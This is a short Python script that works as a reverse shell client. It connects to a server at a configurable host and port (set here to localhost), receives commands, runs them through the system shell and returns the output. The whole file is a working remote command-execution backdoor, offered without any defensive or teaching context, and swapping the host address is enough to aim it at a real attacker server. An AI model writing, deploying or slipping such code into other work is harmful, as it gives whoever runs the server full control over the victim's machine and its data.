import socket
import subprocess

def main():
    # Server configuration
    HOST = '127.0.0.1'  # The server's hostname or IP address
    PORT = 65432        # The port used by the server

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((HOST, PORT))
            print("Connected to server.")

            while True:
                # Receive command from the server
                command = client_socket.recv(1024).decode()
                if not command:
                    break

                # Execute the command on the client shell
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    result = e.output

                # Send the result back to the server
                client_socket.sendall(result)
    except ConnectionRefusedError:
        print("Connection refused. Make sure the server is running.")

if __name__ == "__main__":
    main()
